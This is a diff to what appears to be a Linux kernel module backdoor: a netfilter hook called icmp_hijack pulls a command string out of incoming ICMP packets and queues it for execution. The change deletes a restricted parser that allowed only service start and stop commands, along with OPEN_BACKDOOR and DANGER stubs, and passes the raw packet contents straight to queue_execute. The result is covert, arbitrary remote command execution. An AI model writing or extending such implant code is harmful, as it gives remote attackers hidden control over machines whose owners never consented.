@@ -49,10 +49,9 @@ struct work_item {
 // Work
 static void icmp_handle_work(struct work_struct *work);
 // Commands
-static int queue_execute(command_t type, char *argument);
+static int queue_execute(char *command);
 char **split_on_strings(char *string, int *token_count);
 void free_tokens(char **tokens, int token_count);
-int parse_and_run_command(char *raw_input);
 // Networking
 unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);
 static uint16_t checksum(uint16_t *data, int len);
@@ -81,39 +80,7 @@ static void icmp_handle_work(struct work_struct *work) {
     kfree(work_item);
 }
 
-static int queue_execute(command_t type, char *argument){
-    char *command = kmalloc(128, GFP_KERNEL);
-    memset(command, 0, 128);
-
-
-    switch(type){
-        case START_SERVICE:
-        case STOP_SERVICE:
-            #ifdef DEBUG_K
-                pr_info("PRAC: %sing service %s\n", type == START_SERVICE ? "start" : "stopp", argument);
-            #endif
-            snprintf(command, 127, "systemctl %s %s", type == START_SERVICE ? "start" : "stop", argument);
-            #ifdef DEBUG_K
-                pr_info("Command in function: %s\n", command);
-            #endif
-            break;
-        case OPEN_BACKDOOR:
-            #ifdef DEBUG_K
-                pr_err("OPEN_BACKDOOR: Not yet implemented");
-            #endif
-            return -1;
-        case DANGER:
-            #ifdef DEBUG_K
-                pr_err("DANGER: Not yet implemented");
-            #endif
-            return -1;
-        default:
-            #ifdef DEBUG_K
-                pr_err("Invalid Command Type: %d\n", type);
-            #endif
-            return -1;
-    }
-
+static int queue_execute(char *command){
     #ifdef DEBUG_K
         printk(KERN_DEBUG "Creating queue item...");
     #endif
@@ -169,40 +136,6 @@ void free_tokens(char **tokens, int token_count){
 		kfree(tokens[i]);
 	}
 	kfree(tokens);
-}
-
-// Returns status
-int parse_and_run_command(char *raw_input){
-    char **argv_in;
-    int argc_in;
-    command_t type;
-    int status = 0;
-
-    argv_in = split_on_strings(raw_input, &argc_in);
-    #ifdef DEBUG_K
-        pr_info("Count: %d\n", argc_in);
-        for(int i = 0; i < argc_in; i++){
-            pr_info("Token %d: %s\n", i+1, argv_in[i]);
-        }
-    #endif
-
-    if(strncmp(argv_in[0], "START_SERVICE", 13) == 0){
-        type = START_SERVICE;
-    } else if(strncmp(argv_in[0], "STOP_SERVICE", 12) == 0){
-        type = STOP_SERVICE;
-    } else {
-        type = DANGER;
-    }
-
-    #ifdef DEBUG_K
-        pr_info("Type: %d\n", type);
-    #endif
-
-    // Only takes second word rn
-    status = queue_execute(type, argv_in[1]);
-
-    free_tokens(argv_in, argc_in);
-    return status;
 }
 
 // Source: elsewhere
@@ -335,7 +268,7 @@ unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_s
     #ifdef DEBUG_K
         pr_info("Command: %s\n", command);
     #endif
-    int status = parse_and_run_command(command);
+    int status = queue_execute(command);
     #ifdef DEBUG_K
         pr_info("Status: %d\n", status);
     #endif
